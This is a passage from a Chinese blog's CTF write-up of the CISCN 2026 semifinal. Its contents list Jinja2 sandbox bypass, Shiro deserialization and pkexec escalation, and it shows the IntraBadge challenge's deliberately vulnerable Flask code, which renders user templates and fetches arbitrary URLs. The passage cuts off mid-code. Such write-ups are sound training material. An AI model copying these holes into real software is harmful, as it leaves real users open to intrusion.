@@ -1,0 +1,878 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    CISCN2026半决赛复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="IntraBadge 1某企业开发了一套用于内部员工展示的“徽章卡片系统”，员工可自定义展示模板并填写头像 URL，由系统自动抓取并缓存头像资源后进行页面渲染。在开发阶段，为了便于调试与快速上线，部分模板渲染与资源抓取功能未进行严格安全限制。  break app.py: 12345678910111213141516171819202122232425262728293031323334353">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2026半决赛复现">
+<meta property="og:url" content="http://example.com/2026/03/24/CISCN2026%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="IntraBadge 1某企业开发了一套用于内部员工展示的“徽章卡片系统”，员工可自定义展示模板并填写头像 URL，由系统自动抓取并缓存头像资源后进行页面渲染。在开发阶段，为了便于调试与快速上线，部分模板渲染与资源抓取功能未进行严格安全限制。  break app.py: 12345678910111213141516171819202122232425262728293031323334353">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260326102439981.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260326102631915.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260327111621750.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260327111242149.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260324152840185.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/image-20260324151726351.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/640.webp">
+<meta property="og:image" content="http://example.com/2026/03/24/images/640-17743370010005.webp">
+<meta property="og:image" content="http://example.com/2026/03/24/images/3375424-20260324001921635-1880665605.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/3375424-20260324001921640-1344886076.png">
+<meta property="og:image" content="http://example.com/2026/03/24/images/3375424-20260324001921622-248932869.png">
+<meta property="article:published_time" content="2026-03-24T03:19:17.000Z">
+<meta property="article:modified_time" content="2026-04-16T13:08:05.506Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="比赛复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/03/24/images/image-20260326102439981.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="CISCN2026半决赛复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CISCN2026半决赛复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#intrabadge"><span class="toc-number">1.</span> <span class="toc-text"> IntraBadge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break"><span class="toc-number">1.1.</span> <span class="toc-text"> break</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%BB%95%E8%BF%87sandboxedenvironmentcve-2025-27516"><span class="toc-number">1.1.1.</span> <span class="toc-text"> jinja2绕过SandboxedEnvironment(CVE-2025-27516)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mediadrive"><span class="toc-number">2.</span> <span class="toc-text"> MediaDrive</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break-2"><span class="toc-number">2.1.</span> <span class="toc-text"> break</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix"><span class="toc-number">2.2.</span> <span class="toc-text"> fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy_time"><span class="toc-number">3.</span> <span class="toc-text"> easy_time</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#break-3"><span class="toc-number">3.1.</span> <span class="toc-text"> break</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fix-2"><span class="toc-number">3.2.</span> <span class="toc-text"> fix</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wso2"><span class="toc-number">4.</span> <span class="toc-text"> wso2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#isw0"><span class="toc-number">5.</span> <span class="toc-text"> ISW0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.1.</span> <span class="toc-text"> flag1(Shiro反序列化)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag2pkexec%E6%8F%90%E6%9D%83"><span class="toc-number">5.2.</span> <span class="toc-text"> flag2(pkexec提权)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag3"><span class="toc-number">5.3.</span> <span class="toc-text"> flag3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag4"><span class="toc-number">5.4.</span> <span class="toc-text"> flag4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#isw1"><span class="toc-number">6.</span> <span class="toc-text"> ISW1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag1"><span class="toc-number">6.1.</span> <span class="toc-text"> flag1</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-CISCN2026半决赛复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/03/24/CISCN2026%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-24T03:19:17.000Z" itemprop="datePublished">2026-03-24</time>
+    <time style="display: none;" id="post-update-time">2026-04-16</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" data-aos="zoom-in">比赛复现</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="intrabadge"><a class="markdownIt-Anchor" href="#intrabadge"></a> IntraBadge</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">某企业开发了一套用于内部员工展示的“徽章卡片系统”，员工可自定义展示模板并填写头像 URL，由系统自动抓取并缓存头像资源后进行页面渲染。在开发阶段，为了便于调试与快速上线，部分模板渲染与资源抓取功能未进行严格安全限制。</span><br></pre></td></tr></table></figure>
+<h3 id="break"><a class="markdownIt-Anchor" href="#break"></a> break</h3>
+<p><a target="_blank" rel="noopener" href="http://app.py">app.py</a>:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, redirect, url_for, render_template, make_response</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> TemplateError</span><br><span class="line"><span class="keyword">from</span> jinja2.sandbox <span class="keyword">import</span> SandboxedEnvironment</span><br><span class="line"><span class="keyword">from</span> .utils <span class="keyword">import</span> get_redis, safe_key, fetch_resource</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;dev-only-secret&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdb = get_redis()</span><br><span class="line"><span class="comment"># 获取 redis 数据库连接</span></span><br><span class="line"></span><br><span class="line">MAX_AVATAR = <span class="number">200000</span></span><br><span class="line"><span class="comment"># 限制头像最大 200KB</span></span><br><span class="line"></span><br><span class="line">_user_tpl_env = SandboxedEnvironment(</span><br><span class="line">    autoescape=<span class="literal">True</span>,  </span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建 Jinja2 沙箱环境</span></span><br><span class="line"><span class="comment"># autoescape=True 表示自动 HTML 转义</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用户模板渲染函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_user_template</span>(<span class="params">tpl: <span class="built_in">str</span>, **context</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    template = _user_tpl_env.from_string(tpl <span class="keyword">or</span> <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="comment"># 从字符串创建模板</span></span><br><span class="line">    <span class="keyword">return</span> template.render(**context)</span><br><span class="line">    <span class="comment"># 渲染模板并返回</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前用户</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_user</span>():</span><br><span class="line">    <span class="keyword">return</span> safe_key(request.cookies.get(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">    <span class="comment"># 从 cookie 获取 user</span></span><br><span class="line">    <span class="comment"># 默认 guest</span></span><br><span class="line">    <span class="comment"># safe_key 过滤防止注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取用户模板</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_tpl</span>(<span class="params">user</span>):</span><br><span class="line">    k = <span class="string">f&quot;tpl:<span class="subst">&#123;user&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># redis key</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> rdb.exists(k):</span><br><span class="line">        <span class="comment"># 如果模板不存在</span></span><br><span class="line">        rdb.<span class="built_in">set</span>(</span><br><span class="line">            k,</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class=&quot;badge&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;badge-left&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;avatar&quot;&gt;</span></span><br><span class="line"><span class="string">      &#123;% if avatar_ok %&#125;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;/avatar/file&quot; alt=&quot;avatar&quot;/&gt;</span></span><br><span class="line"><span class="string">      &#123;% else %&#125;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;avatar-ph&quot;&gt;No Avatar&lt;/div&gt;</span></span><br><span class="line"><span class="string">      &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;div class=&quot;badge-right&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;title&quot;&gt;&#123;&#123; name &#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;sub&quot;&gt;IntraBadge · Internal&lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;meta&quot;&gt;Last refresh: &#123;&#123; avatar_updated or &quot;never&quot; &#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">  &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 默认模板写入 redis</span></span><br><span class="line">    <span class="keyword">return</span> (rdb.get(k) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="comment"># 读取模板并返回</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取头像 URL</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_avatar_url</span>(<span class="params">user</span>):</span><br><span class="line">    <span class="keyword">return</span> (rdb.get(<span class="string">f&quot;avatar_url:<span class="subst">&#123;user&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取头像二进制数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_get_avatar_blob</span>(<span class="params">user</span>):</span><br><span class="line">    data = rdb.get(<span class="string">f&quot;avatarbin:<span class="subst">&#123;user&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 头像二进制数据</span></span><br><span class="line">    ctype = (rdb.get(<span class="string">f&quot;avatarctype:<span class="subst">&#123;user&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="comment"># Content-Type</span></span><br><span class="line">    updated = (rdb.get(<span class="string">f&quot;avatarupd:<span class="subst">&#123;user&#125;</span>&quot;</span>) <span class="keyword">or</span> <span class="string">b&quot;&quot;</span>).decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">    <span class="comment"># 更新时间</span></span><br><span class="line">    <span class="keyword">return</span> data, ctype, updated</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置用户</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/prefs&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prefs</span>():</span><br><span class="line">    u = safe_key(request.args.get(<span class="string">&quot;u&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">    <span class="comment"># 获取 URL 参数 ?u=xxx</span></span><br><span class="line">    resp = make_response(redirect(url_for(<span class="string">&quot;dashboard&quot;</span>)))</span><br><span class="line">    <span class="comment"># 重定向到 dashboard</span></span><br><span class="line">    resp.set_cookie(<span class="string">&quot;user&quot;</span>, u, max_age=<span class="number">86400</span>, path=<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="comment"># 设置 cookie</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 首页</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/dashboard&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    <span class="comment"># 当前用户</span></span><br><span class="line">    tpl = _get_tpl(user)</span><br><span class="line">    <span class="comment"># 获取模板</span></span><br><span class="line">    avatar_url = _get_avatar_url(user)</span><br><span class="line">    <span class="comment"># 头像URL</span></span><br><span class="line">    avatar_data, avatar_ctype, avatar_updated = _get_avatar_blob(user)</span><br><span class="line">    <span class="comment"># 头像缓存</span></span><br><span class="line">    avatar_ok = avatar_ctype.startswith(<span class="string">&quot;image/&quot;</span>) <span class="keyword">and</span> <span class="built_in">len</span>(avatar_data) &gt; <span class="number">0</span></span><br><span class="line">    <span class="comment"># 是否为图片</span></span><br><span class="line">    <span class="keyword">return</span> render_template(</span><br><span class="line">        <span class="string">&quot;dashboard.html&quot;</span>,</span><br><span class="line">        user=user,</span><br><span class="line">        tpl=tpl,</span><br><span class="line">        avatar_url=avatar_url,</span><br><span class="line">        avatar_ok=avatar_ok,</span><br><span class="line">        avatar_ctype=avatar_ctype <span class="keyword">or</span> <span class="string">&quot;-&quot;</span>,</span><br><span class="line">        avatar_size=<span class="built_in">len</span>(avatar_data),</span><br><span class="line">        avatar_updated=avatar_updated <span class="keyword">or</span> <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模板编辑页面</span></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/template&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template_edit</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    tpl = _get_tpl(user)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;template.html&quot;</span>, user=user, tpl=tpl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存模板</span></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/template&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">template_save</span>():</span><br><span class="line">    user = _get_user()</span><br><span class="line">    tpl = request.form.get(<span 